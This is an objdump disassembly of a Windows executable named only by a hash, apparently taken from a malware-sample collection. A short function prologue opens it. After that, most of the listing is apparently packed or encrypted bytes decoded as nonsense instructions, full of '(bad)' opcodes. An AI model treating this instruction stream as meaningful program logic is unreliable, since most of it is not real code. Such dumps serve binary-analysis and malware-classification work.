
44ce3821f28bbe82058284beaabbe9a1d2d3d4d326cb1e855edd8e1c79833edf.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x448fa8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x448fac
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x448fb0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x448fb4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x448fb8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x448fbc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x448fc0
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x448fc4
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x448fc6
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417000
  4010e9:	test   eax,eax
  4010eb:	je     0x4152d6
  4010f1:	mov    edx,DWORD PTR [ebp-0x10]
  4010f4:	add    edx,0x1
  4010f7:	mov    DWORD PTR [ebp-0x10],edx
  4010fa:	(bad)  
  4010fb:	cmp    al,0x86
  4010fd:	dec    edx
  4010fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010ff:	mov    bl,0xcd
  401101:	pop    eax
  401102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401103:	mov    esp,0x53f8395f
  401108:	cwde   
  401109:	imul   esp,DWORD PTR [ebx-0x16],0xffffffef
  40110d:	mov    ebp,0x8c7c3606
  401112:	or     eax,0xd7c870fa
  401117:	jge    0x40115c
  401119:	call   0x9eeb842
  40111e:	sub    DWORD PTR [edx+edi*8-0x23],esi
  401122:	sbb    ah,BYTE PTR [edi-0x698869cc]
  401128:	push   0xffffff88
  40112a:	repz mov ah,0x9e
  40112d:	rol    DWORD PTR [esi+0x2d],cl
  401130:	sub    bl,BYTE PTR [edx]
  401132:	dec    ebp
  401133:	jae    0x401190
  401135:	adc    eax,0x38566937
  40113a:	mov    ah,0xdb
  40113c:	jae    0x4010fc
  40113e:	dec    ebp
  40113f:	(bad)  
  401140:	das    
  401141:	or     BYTE PTR [ebx+ebp*8],cl
  401144:	jl     0x401136
  401146:	push   ebp
  401147:	lahf   
  401148:	sahf   
  401149:	adc    bl,BYTE PTR [esi+0x5c]
  40114c:	fwait
  40114d:	jmp    0x40116e
  40114f:	and    al,0xec
  401151:	dec    ebx
  401152:	int    0x33
  401154:	retf   0xee95
  401157:	hlt    
  401158:	in     eax,dx
  401159:	inc    edx
  40115a:	push   esi
  40115b:	pushf  
  40115c:	mov    eax,0xe5dca3e1
  401161:	stc    
  401162:	xchg   dl,ah
  401164:	dec    eax
  401165:	pop    ecx
  401166:	loopne 0x40118f
  401168:	pop    ds
  401169:	outs   dx,DWORD PTR ds:[esi]
  40116a:	jb     0x4010f4
  40116c:	stos   DWORD PTR es:[edi],eax
  40116d:	sub    al,0xa6
  40116f:	push   ax
  401171:	or     edi,ebx
  401173:	sbb    eax,0xb71fac58
  401178:	popa   
  401179:	rcr    eax,0x79
  40117c:	and    bl,BYTE PTR [esi+ebp*2+0x62977c25]
  401183:	mov    dh,0x22
  401185:	fwait
  401186:	shr    DWORD PTR [ecx+ecx*2-0x3a],cl
  40118a:	jp     0x4011e8
  40118c:	xor    eax,0xbb296164
  401191:	mov    esp,0xef3c9a98
  401196:	inc    ecx
  401197:	enter  0xa6e5,0x22
  40119b:	jmp    0x40114f
  40119d:	and    eax,0xb38c77a
  4011a2:	xor    al,0x0
  4011a4:	cli    
  4011a5:	ficomp WORD PTR [esi+0x5e]
  4011a8:	cmp    BYTE PTR [ebx-0x18],0xc7
  4011ac:	cli    
  4011ad:	hlt    
  4011ae:	mov    edi,DWORD PTR [ebx]
  4011b0:	es hlt 
  4011b2:	sbb    BYTE PTR [esi-0x558b423f],bh
  4011b8:	data16 sahf 
  4011ba:	jo     0x40118a
  4011bc:	int    0x40
  4011be:	sti    
  4011bf:	xchg   DWORD PTR [ecx+0x32af91e6],eax
  4011c5:	add    al,BYTE PTR [edi]
  4011c7:	int    0x50
  4011c9:	in     eax,dx
  4011ca:	sbb    DWORD PTR [ebx-0x64c3361f],esp
  4011d0:	and    edx,DWORD PTR [edi+0x34]
  4011d3:	clc    
  4011d4:	sbb    esp,ebx
  4011d6:	fsubr  st(2),st
  4011d8:	call   FWORD PTR [eax]
  4011da:	(bad)  
  4011db:	out    0x96,al
  4011dd:	inc    ebx
  4011de:	ficomp WORD PTR [eax]
  4011e0:	sub    BYTE PTR ds:0xfdb2a45c,bl
  4011e6:	push   ds
  4011e7:	icebp  
  4011e8:	ret    
  4011e9:	mov    cl,0xdd
  4011eb:	aaa    
  4011ec:	call   0x9508:0xe3b327cb
  4011f3:	cmp    DWORD PTR cs:[ecx+0x20],ebx
  4011f7:	mov    esp,0x4120d524
  4011fc:	pop    edx
  4011fd:	and    eax,0xbf54a6ad
  401202:	push   edx
  401203:	aas    
  401204:	in     eax,dx
  401205:	dec    ebx
  401206:	js     0x4011c7
  401208:	sbb    al,0x1a
  40120a:	retf   0x346d
  40120d:	cli    
  40120e:	push   esp
  40120f:	xchg   DWORD PTR [eax],ecx
  401211:	aad    0x89
  401213:	add    BYTE PTR [esp+ebx*8],ah
  401216:	add    DWORD PTR [esi-0x4e2ede13],0x7e6eb2ae
  401220:	mov    esi,0xe0bf8141
  401225:	adc    DWORD PTR [ebx+edx*1],eax
  401228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401229:	xchg   edi,eax
  40122a:	inc    eax
  40122b:	ror    DWORD PTR [esi+0xe],0xe1
  40122f:	repnz sbb BYTE PTR [edi+ecx*2-0x49],bl
  401234:	jne    0x401203
  401236:	jns    0x4012b6
  401238:	mov    dh,0x5
  40123a:	jnp    0x401240
  40123c:	xchg   esi,eax
  40123d:	js     0x40129b
  40123f:	add    dl,bl
  401241:	and    al,0x72
  401243:	aad    0xa4
  401245:	or     ebx,DWORD PTR [esi]
  401247:	cmc    
  401248:	cmp    ebp,DWORD PTR [edx]
  40124a:	jle    0x4011dc
  40124c:	dec    esp
  40124d:	add    al,0xdc
  40124f:	mov    esi,ss
  401251:	jp     0x401274
  401253:	inc    eax
  401254:	jl     0x40123f
  401256:	dec    edx
  401257:	adc    eax,0xc2edc58b
  40125c:	sti    
  40125d:	int    0x9b
  40125f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401260:	cmp    ch,ah
  401262:	fsubr  DWORD PTR [ecx+0x532e7803]
  401268:	mov    ds:0xc195d782,eax
  40126d:	mov    ah,0x80
  40126f:	adc    al,cl
  401271:	or     cl,BYTE PTR [edi-0x6137c361]
  401277:	dec    eax
  401278:	cs pop eax
  40127a:	xchg   edx,eax
  40127b:	and    BYTE PTR [ecx+ecx*8],ah
  40127e:	sub    eax,0xfd495080
  401283:	cld    
  401284:	xchg   DWORD PTR [esi],esi
  401286:	cmc    
  401287:	mov    ds:0xea83ec63,al
  40128c:	fisub  WORD PTR [ecx-0x40]
  40128f:	add    BYTE PTR [eax+0x5d],al
  401292:	cmp    DWORD PTR [ebp+0x324be5a8],eax
  401298:	push   0xbac53f15
  40129d:	push   edx
  40129e:	xor    DWORD PTR [ecx+0x5b53a40f],edi
  4012a4:	inc    esi
  4012a5:	ins    BYTE PTR es:[edi],dx
  4012a6:	lds    edx,FWORD PTR [ecx]
  4012a8:	and    al,0x44
  4012aa:	cli    
  4012ab:	jnp    0x401235
  4012ad:	pop    ecx
  4012ae:	leave  
  4012af:	test   DWORD PTR [edx+0x1bdb6b73],ebx
  4012b5:	and    eax,0x3ab43d67
  4012ba:	in     al,0xa7
  4012bc:	xor    ebx,ecx
  4012be:	cmp    bl,dh
  4012c0:	push   es
  4012c1:	jnp    0x401337
  4012c3:	jg     0x401299
  4012c5:	xlat   BYTE PTR ds:[ebx]
  4012c6:	and    ebx,esi
  4012c8:	les    esi,FWORD PTR [ecx+0x69630f98]
  4012ce:	aaa    
  4012cf:	adc    ah,BYTE PTR [ecx+0x6]
  4012d2:	push   ecx
  4012d3:	call   0xed0b:0x8940a289
  4012da:	xchg   ecx,eax
  4012db:	add    ah,bl
  4012dd:	out    dx,al
  4012de:	sub    bl,BYTE PTR [esi-0x5e]
  4012e1:	pop    esp
  4012e2:	push   esp
  4012e3:	jns    0x401278
  4012e5:	es xchg ecx,eax
  4012e7:	cmp    DWORD PTR [edx+edx*2],0x3d12426a
  4012ee:	retf   0xadf7
  4012f1:	inc    edi
  4012f2:	xor    eax,DWORD PTR ds:0x59d4fadf
  4012f8:	inc    esp
  4012f9:	shr    DWORD PTR [edi],1
  4012fb:	pop    esi
  4012fc:	cmp    al,0xa8
  4012fe:	int    0xe4
  401300:	popf   
  401301:	mov    bl,dl
  401303:	cli    
  401304:	pop    ds
  401305:	(bad)  
  401306:	mov    ecx,0xadb6e399
  40130b:	inc    ecx
  40130c:	popf   
  40130d:	ins    BYTE PTR es:[edi],dx
  40130e:	mov    ch,0x24
  401310:	mov    BYTE PTR [esi+0x12],dh
  401313:	add    ah,dl
  401315:	in     al,dx
  401316:	idiv   DWORD PTR ds:0xb66e5238
  40131c:	(bad)  
  40131d:	mov    ebp,0x968b5c57
  401322:	in     al,0x7a
  401324:	cld    
  401325:	stos   BYTE PTR es:[edi],al
  401326:	push   0x1c3f43ed
  40132b:	and    ecx,DWORD PTR [ecx+0x33]
  40132e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40132f:	inc    esi
  401330:	dec    ebp
  401331:	jne    0x401322
  401333:	jnp    0x4012b6
  401335:	nop
  401336:	xchg   BYTE PTR [eax+0x330cbb27],dh
  40133c:	stc    
  40133d:	sbb    DWORD PTR [ebp+0x70],edx
  401340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401341:	ror    DWORD PTR ds:0x25597fec,0x26
  401348:	mov    cl,0xc6
  40134a:	aad    0x82
  40134c:	mov    ebx,0x9f165c8
  401351:	nop
  401352:	dec    edx
  401353:	stc    
  401354:	dec    ebx
  401355:	pop    ebx
  401356:	push   cs
  401357:	jmp    0xae257718
  40135c:	adc    ebp,DWORD PTR [ecx-0xb]
  40135f:	(bad)  
  401360:	test   al,0x58
  401362:	push   ecx
  401363:	test   DWORD PTR cs:[esi-0x60adee5e],edi
  40136a:	mov    dl,0x4e
  40136c:	jo     0x40133c
  40136e:	xor    dl,BYTE PTR [esi-0x71]
  401371:	in     al,dx
  401372:	xchg   edx,eax
  401373:	mov    ebx,0x35d7040e
  401378:	push   cs
  401379:	jle    0x401355
  40137b:	clc    
  40137c:	cld    
  40137d:	pusha  
  40137e:	push   esi
  40137f:	push   ss
  401380:	mov    edi,0x4ce24ed
  401385:	push   ecx
  401386:	xchg   esp,eax
  401387:	sbb    al,0x53
  401389:	adc    esp,DWORD PTR [edx-0x40a60acb]
  40138f:	dec    edx
  401390:	jecxz  0x401383
  401392:	sub    DWORD PTR [ebx+0x61c232a8],eax
  401398:	mov    DWORD PTR [edi+0x1a672e98],edi
  40139e:	(bad)  
  40139f:	adc    BYTE PTR [eax+eax*2-0x5a],bh
  4013a3:	scas   al,BYTE PTR es:[edi]
  4013a4:	stos   DWORD PTR es:[edi],eax
  4013a5:	mov    al,ds:0x14af356a
  4013aa:	div    BYTE PTR [ebp-0x5b]
  4013ad:	pop    ebp
  4013ae:	sub    BYTE PTR [ebx],ah
  4013b0:	mov    ch,0x93
  4013b2:	fcom   st(5)
  4013b4:	dec    ebp
  4013b5:	cdq    
  4013b6:	daa    
  4013b7:	imul   edx,DWORD PTR [ecx+0x50],0xffffff88
  4013bb:	cmp    eax,0x4191c4c3
  4013c0:	sbb    ebp,DWORD PTR [ebp+0x659b3755]
  4013c6:	or     DWORD PTR [edx+0x6d],esp
  4013c9:	push   cs
  4013ca:	in     eax,dx
  4013cb:	into   
  4013cc:	jbe    0x401419
  4013ce:	cmp    esi,edx
  4013d0:	mov    dl,0x9b
  4013d2:	adc    DWORD PTR [esi+0x52],eax
  4013d5:	cmp    al,0xce
  4013d7:	jecxz  0x401409
  4013d9:	repnz sub BYTE PTR [esi+0x28],al
  4013dd:	or     eax,0xe2aacc0d
  4013e2:	mov    bh,0xae
  4013e4:	imul   esi,DWORD PTR [esi],0xffffffe3
  4013e7:	pop    ebp
  4013e8:	xchg   ecx,eax
  4013e9:	(bad)  
  4013ea:	mov    ds:0x48d6569a,al
  4013ef:	mov    bh,dl
  4013f1:	adc    al,0x8f
  4013f3:	pusha  
  4013f4:	xchg   esi,eax
  4013f5:	lods   eax,DWORD PTR ds:[esi]
  4013f6:	xchg   esi,eax
  4013f7:	sub    al,0xf
  4013f9:	sub    al,0x10
  4013fb:	mov    ?,WORD PTR [edi-0x72]
  4013fe:	into   
  4013ff:	in     eax,dx
  401400:	mov    ebp,0xdff5aa4a
  401405:	int3   
  401406:	xchg   esp,esp
  401408:	les    ecx,FWORD PTR [ecx]
  40140a:	fxch   st(7)
  40140c:	ficomp WORD PTR [esi-0xd]
  40140f:	pop    ds
  401410:	shl    BYTE PTR ds:0x68730ed0,1
  401416:	xor    dh,BYTE PTR [eax+ecx*1-0x6f]
  40141a:	push   esi
  40141b:	mov    esi,0x461920d4
  401420:	mov    WORD PTR [ecx-0x5290c6a9],ss
  401426:	jle    0x4013c1
  401428:	shl    DWORD PTR [esi],0x4b
  40142b:	rep stos BYTE PTR es:[edi],al
  40142d:	in     al,dx
  40142e:	adc    BYTE PTR [ecx-0x27],dh
  401431:	ror    DWORD PTR [eax+0x23],1
  401434:	and    eax,0x655b6010
  401439:	mov    edi,0x8ed92db8
  40143e:	jl     0x401480
  401440:	rol    DWORD PTR cs:0x52066cae,1
  401447:	dec    ebp
  401448:	(bad)  [ebp-0x3c]
  40144b:	aad    0x99
  40144d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40144e:	frstor [edi+0x5d]
  401451:	jnp    0x4014b4
  401453:	addr16 test eax,0x67dad10
  401459:	lea    eax,[ebx-0x61]
  40145c:	xchg   ebp,ebp
  40145e:	adc    eax,0x7fad0c48
  401463:	or     DWORD PTR [eax-0x780b70e6],esp
  401469:	adc    al,0xfc
  40146b:	aad    0x66
  40146d:	xor    al,0x4
  40146f:	icebp  
  401470:	cs sbb ch,dl
  401473:	aad    0x78
  401475:	jbe    0x40143c
  401477:	aad    0x91
  401479:	hlt    
  40147a:	adc    bl,BYTE PTR [eax-0x18586b39]
  401480:	aad    0x8b
  401482:	lods   al,BYTE PTR ds:[esi]
  401483:	rcr    DWORD PTR [eax],1
  401485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401486:	mov    eax,es:0x50d68b9e
  40148c:	mov    edx,0xeac2aef5
  401491:	aas    
  401492:	push   esp
  401493:	lock xchg ebx,ebp
  401496:	cmp    edi,DWORD PTR [ecx-0x15]
  401499:	mov    edi,0xf10ba41c
  40149e:	call   0x413c:0x7df3adaf
  4014a5:	rol    eax,cl
  4014a7:	std    
  4014a8:	shr    DWORD PTR [eax+eiz*1],cl
  4014ab:	shl    DWORD PTR [edx-0x5afb40de],0xc7
  4014b2:	clc    
  4014b3:	sti    
  4014b4:	and    eax,0x636ecea6
  4014b9:	push   ecx
  4014ba:	out    0xdc,eax
  4014bc:	push   ebx
  4014be:	jecxz  0x4014f5
  4014c0:	xor    eax,DWORD PTR [eax+0x5f]
  4014c3:	sub    dh,BYTE PTR [ebp-0x3b389bd0]
  4014c9:	xor    BYTE PTR [ebp+0x4f1e5593],cl
  4014cf:	adc    eax,0xecf51834
  4014d4:	fucomip st,st(6)
  4014d6:	std    
  4014d7:	aas    
  4014d8:	jbe    0x401491
  4014da:	dec    edx
  4014db:	dec    ebp
  4014dc:	and    eax,0xedadae6
  4014e1:	push   ebx
  4014e2:	dec    esi
  4014e3:	push   esi
  4014e4:	fwait
  4014e5:	(bad)
  4014e9:	xor    eax,DWORD PTR [ebx+0x4f487043]
  4014ef:	data16 in al,0x56
  4014f2:	test   DWORD PTR [esi-0x70d9c065],eax
  4014f8:	mov    BYTE PTR [esi-0x9],bh
  4014fb:	leave  
  4014fc:	mov    esi,eax
  4014fe:	push   esp
  4014ff:	pop    ss
  401500:	std    
  401501:	out    0xf2,al
  401503:	mov    esp,ebx
  401505:	sub    bh,BYTE PTR [eax+0x41]
  401508:	sub    eax,0xf5cdcf55
  40150d:	jae    0x40155a
  40150f:	je     0x40156f
  401511:	inc    ecx
  401512:	pop    ebp
  401513:	je     0x401534
  401515:	adc    eax,0x32004082
  40151a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40151b:	mov    cl,0x43
  40151d:	mov    ebx,0xb5adeb4a
  401522:	and    DWORD PTR [edx-0x125e4bd],esi
  401528:	jns    0x4014f8
  40152a:	jmp    0xb206:0x8e690420
  401531:	and    DWORD PTR [edx-0x33],0xdff7d052
  401538:	cmp    cl,BYTE PTR [esi+ebx*8+0x7fd6892a]
  40153f:	out    0x46,eax
  401541:	mov    ecx,0xb5cbb54f
  401546:	retf   0x2481
  401549:	inc    esp
  40154a:	outs   dx,DWORD PTR ds:[esi]
  40154b:	push   ebp
  40154c:	mov    edx,0xcab17030
  401551:	cdq    
  401552:	int3   
  401553:	iret   
  401554:	or     bl,0xbf
  401557:	lock aaa 
  401559:	dec    esp
  40155a:	dec    ebx
  40155b:	jne    0x401566
  40155d:	or     BYTE PTR [ecx+0x5aa49fc8],dl
  401563:	retf   0xe151
  401566:	mov    al,0xb0
  401568:	inc    edx
  401569:	inc    edi
  40156a:	xor    DWORD PTR [edx-0x28ed7c3],edi
  401570:	sti    
  401571:	xlat   BYTE PTR ds:[ebx]
  401572:	(bad)  
  401573:	mov    cl,0xc6
  401575:	bound  edi,QWORD PTR [ebp-0x68]
  401578:	mov    eax,ds:0x66fc65ec
  40157d:	push   edx
  40157e:	les    esi,FWORD PTR [ebx]
  401580:	imul   ebp,esi,0x4a508428
  401586:	add    eax,0x68c191b1
  40158b:	cmp    esi,DWORD PTR [ebp-0x34c3cc86]
  401591:	jg     0x401568
  401593:	sub    eax,0x4ae19b0e
  401598:	lock scas eax,DWORD PTR es:[edi]
  40159a:	mov    esi,0xaed21d31
  40159f:	push   cs
  4015a0:	push   ecx
  4015a1:	adc    al,0xbc
  4015a3:	jmp    0x401566
  4015a5:	add    ah,BYTE PTR [ebp+0x21c257ab]
  4015ab:	sub    BYTE PTR [ecx+0x19],0xc2
  4015af:	imul   edx,DWORD PTR [esi],0x5a370013
  4015b5:	sub    DWORD PTR [edx+ebx*8],0xc33909d1
  4015bc:	push   esp
  4015bd:	sub    bh,al
  4015bf:	add    eax,0x1d86f51d
  4015c4:	jge    0x401623
  4015c6:	or     al,0x2e
  4015c8:	js     0x40155d
  4015ca:	cmp    ah,BYTE PTR [ecx]
  4015cc:	adc    eax,0x360f4860
  4015d1:	mov    ch,0x39
  4015d3:	or     cl,dl
  4015d5:	mov    al,ds:0x9a80aa
  4015da:	xor    eax,0xa17f6b31
  4015e0:	leave  
  4015e1:	inc    edi
  4015e2:	or     al,0xfd
  4015e4:	cld    
  4015e5:	mov    al,BYTE PTR [edi+0x29]
  4015e8:	cmp    al,0x4d
  4015ea:	inc    BYTE PTR [edx]
  4015ec:	test   eax,0x93d40eec
  4015f1:	jmp    0x40160d
  4015f3:	dec    edx
  4015f4:	in     eax,0x82
  4015f6:	or     dl,BYTE PTR [eax-0x7d]
  4015f9:	out    dx,eax
  4015fa:	loopne 0x401584
  4015fc:	and    esi,DWORD PTR [ecx+0xc]
  4015ff:	push   ss
  401600:	(bad)  
  401601:	outs   dx,BYTE PTR ds:[esi]
  401602:	repnz sub eax,0xa8c7a904
  401608:	popf   
  401609:	cmp    bl,BYTE PTR [edi]
  40160b:	add    al,dh
  40160d:	mov    bh,0x89
  40160f:	adc    al,0x32
  401611:	dec    ebp
  401612:	push   0x43f7cf09
  401617:	sub    eax,0xf73c6998
  40161c:	push   ds
  40161d:	push   ebx
  40161e:	imul   edx,ebx,0x68
  401621:	cwde   
  401622:	stc    
  401623:	stos   BYTE PTR es:[edi],al
  401624:	push   edi
  401625:	rcr    cl,0x76
  401628:	push   edx
  401629:	test   al,0x5b
  40162b:	push   ebx
  40162c:	pop    ss
  40162d:	(bad)  [esi]
  40162f:	lds    ebp,FWORD PTR [ebx-0x2b]
  401632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401633:	loopne 0x401683
  401635:	data16 sahf 
  401637:	mov    edx,0xcf29662b
  40163c:	scas   eax,DWORD PTR es:[edi]
  40163d:	scas   al,BYTE PTR es:[edi]
  40163e:	jecxz  0x401699
  401640:	mov    ecx,0x2514f7f8
  401645:	mov    ebp,0xa748a846
  40164a:	pusha  
  40164b:	mov    dl,0x3f
  40164d:	jmp    0xad9a:0xa3930f51
  401654:	or     edi,DWORD PTR [ecx+0x5826364]
  40165a:	hlt    
  40165b:	retf   0xba6d
  40165e:	jp     0x4015eb
  401660:	push   eax
  401661:	cs in  eax,0x96
  401664:	xchg   BYTE PTR [esi+0x1083b1dd],ah
  40166a:	adc    DWORD PTR [edi-0x520f33ef],0xd767c577
  401674:	sub    al,cl
  401676:	pushf  
  401677:	and    BYTE PTR [ecx+eiz*8+0x558c55e7],bh
  40167e:	inc    eax
  40167f:	xor    BYTE PTR [edi-0x9a5a08e],dl
  401685:	push   ss
  401686:	jmp    0x40169c
  401688:	and    cl,BYTE PTR [ecx+ecx*8+0x6d]
  40168c:	mov    BYTE PTR [edx+ecx*4+0x42c9584],0xd3
  401694:	jge    0x401679
  401696:	retf   
  401697:	sub    DWORD PTR [ecx-0x1e69af34],ebp
  40169d:	sbb    BYTE PTR [ebx-0x64],cl
  4016a0:	cmp    BYTE PTR [esi+0x35],0x4f
  4016a4:	sub    al,0x25
  4016a6:	and    al,0xf5
  4016a8:	push   ecx
  4016a9:	cmc    
  4016aa:	dec    edi
  4016ab:	jg     0x4016b4
  4016ad:	jmp    0x4016e5
  4016af:	stc    
  4016b0:	sbb    BYTE PTR [ebx+eiz*8+0x445eec64],cl
  4016b7:	mov    ebx,DWORD PTR [ebx+0x5d]
  4016ba:	in     al,0x82
  4016bc:	mov    esp,?
  4016be:	xchg   edx,eax
  4016bf:	popa   
  4016c0:	rol    esi,cl
  4016c2:	sar    BYTE PTR [edi],cl
  4016c4:	test   ch,cl
  4016c6:	or     eax,0xf4f1a414
  4016cb:	popf   
  4016cc:	out    0x12,eax
  4016ce:	ror    dh,0xcf
  4016d1:	test   BYTE PTR [esi-0x410e7cdb],0x40
  4016d8:	push   0x56
  4016da:	dec    ebx
  4016db:	pop    ebx
  4016dc:	push   ebx
  4016dd:	xchg   edi,eax
  4016de:	in     eax,0x6
  4016e0:	call   0x945a4291
  4016e5:	cmp    BYTE PTR [eax+0x15aef044],bh
  4016eb:	not    DWORD PTR [eax-0x3e7cac34]
  4016f1:	repnz imul edi,ebp,0x6aa31287
  4016f8:	leave  
  4016f9:	stc    
  4016fa:	xor    al,0x82
  4016fc:	or     al,0xe7
  4016fe:	xor    esp,DWORD PTR [ecx-0x6d77e7b0]
  401704:	mov    ds:0xd178fe27,al
  401709:	sub    BYTE PTR [edi+0x3],0x4c
  40170d:	sbb    BYTE PTR [eax],dh
  40170f:	outs   dx,DWORD PTR ds:[esi]
  401710:	push   ecx
  401711:	push   esp
  401712:	mov    ch,al
  401714:	mov    eax,0x96b7777
  401719:	test   eax,0x24bc7451
  40171e:	rol    bh,0xd2
  401721:	ja     0x401748
  401723:	push   ebx
  401724:	xchg   BYTE PTR [eax-0x50],al
  401727:	inc    edx
  401728:	out    dx,eax
  401729:	jne    0x4016c5
  40172b:	jae    0x4016f1
  40172d:	mov    eax,DWORD PTR [edi-0x5f]
  401730:	scas   al,BYTE PTR es:[edi]
  401731:	push   edi
  401732:	pop    esp
  401733:	mov    ebx,0x6770506
  401738:	cli    
  401739:	sub    bh,BYTE PTR [edx-0x5ee9d093]
  40173f:	and    BYTE PTR [ebx+ecx*4],cl
  401742:	and    eax,0x905bd2db
  401747:	inc    ebx
  401748:	xchg   DWORD PTR [eax+0x75],edx
  40174b:	ds push esi
  40174d:	fidivr WORD PTR [ecx+edx*8+0x6d581a04]
  401754:	vunpckhps ymm1,ymm3,YMMWORD PTR [ecx+edi*2-0x7c]
  40175b:	and    ebp,esi
  40175d:	xor    ebp,eax
  40175f:	gs mov ah,0xc6
  401762:	fcmovu st,st(4)
  401764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401765:	repz scas eax,DWORD PTR es:[edi]
  401767:	(bad)  
  401768:	stos   BYTE PTR es:[edi],al
  401769:	adc    eax,0x34dab14e
  40176e:	retf   
  40176f:	bound  ecx,QWORD PTR [eax-0x5da04288]
  401775:	pop    ds
  401776:	sub    esp,DWORD PTR [ecx]
  401778:	shl    BYTE PTR [eax],0xa0
  40177b:	or     al,0x47
  40177d:	inc    edi
  40177e:	aas    
  40177f:	mov    ecx,0x42334bd3
  401784:	pop    es
  401785:	retf   
  401786:	loop   0x401757
  401788:	and    al,0x1f
  40178a:	imul   ebp,DWORD PTR [esi+ebx*8+0x21014ce5],0x3
  401792:	adc    edx,DWORD PTR [eax]
  401794:	push   ebp
  401795:	push   DWORD PTR [ecx+edx*1+0xceebf19]
  40179c:	stos   BYTE PTR es:[edi],al
  40179d:	repnz ds adc al,0x6
  4017a1:	cmp    bl,0x4b
  4017a4:	shr    DWORD PTR ds:0xa53c8ec3,0xfe
  4017ab:	into   
  4017ac:	jb     0x4017e5
  4017ae:	push   ss
  4017af:	sbb    DWORD PTR [eax-0x57],eax
  4017b2:	sbb    al,0x4a
  4017b4:	push   ds
  4017b5:	adc    al,0x3a
  4017b7:	dec    ecx
  4017b8:	push   es
  4017b9:	stos   BYTE PTR es:[edi],al
  4017ba:	push   0x8a6716fe
  4017bf:	outs   dx,BYTE PTR ds:[esi]
  4017c0:	(bad)  
  4017c1:	lahf   
  4017c2:	pop    edx
  4017c3:	repz call 0xeb617399
  4017c9:	imul   ebx,DWORD PTR [ebx],0x9fae4d72
  4017cf:	jl     0x401843
  4017d1:	lods   eax,DWORD PTR ds:[esi]
  4017d2:	dec    ebx
  4017d3:	xchg   ecx,eax
  4017d4:	sti    
  4017d5:	push   cs
  4017d6:	inc    ebp
  4017d7:	cdq    
  4017d8:	jne    0x40178c
  4017da:	push   0x690a9978
  4017df:	(bad)  
  4017e0:	fstp   QWORD PTR [ebx+edi*4]
  4017e3:	test   ch,bh
  4017e5:	ret    0x93d4
  4017e8:	(bad)  
  4017e9:	jne    0x4017f4
  4017eb:	fdivrp st(2),st
  4017ed:	mov    ds,WORD PTR [edx+esi*2+0x14b26e0c]
  4017f4:	jbe    0x40179d
  4017f6:	rcr    DWORD PTR [ebp-0x23fe5946],cl
  4017fc:	push   cs
  4017fd:	pop    esp
  4017fe:	shl    DWORD PTR [eax+0x2],0xb1
  401802:	and    eax,0x36ace230
  401807:	mov    al,ds:0xdf65b036
  40180c:	push   ds
  40180d:	jmp    0x40182e
  40180f:	or     BYTE PTR [ebx],bl
  401811:	iret   
  401812:	cdq    
  401813:	add    bl,BYTE PTR [ebx+0x707c4cae]
  401819:	fwait
  40181a:	int3   
  40181b:	or     bl,bh
  40181d:	fs daa 
  40181f:	push   0x5d
  401821:	or     al,0x97
  401823:	leave  
  401824:	xrelease mov DWORD PTR [ecx],ecx
  401827:	mov    dl,0xaf
  401829:	push   eax
  40182a:	in     eax,0xe2
  40182c:	jge    0x4018a1
  40182e:	add    BYTE PTR [edx],bh
  401830:	or     ch,dl
  401832:	pop    ss
  401833:	mov    ah,0x6a
  401835:	shl    BYTE PTR [eax+0x1],cl
  401838:	mov    DWORD PTR [esi-0x197bda9a],edi
  40183e:	mov    eax,0x6d706bcb
  401843:	add    BYTE PTR [edx+0x7bb52212],dl
  401849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40184a:	ins    BYTE PTR es:[edi],dx
  40184b:	jg     0x40188d
  40184d:	jg     0x401847
  40184f:	call   0x292e:0x78a729cf
  401856:	cmp    BYTE PTR [esi],bh
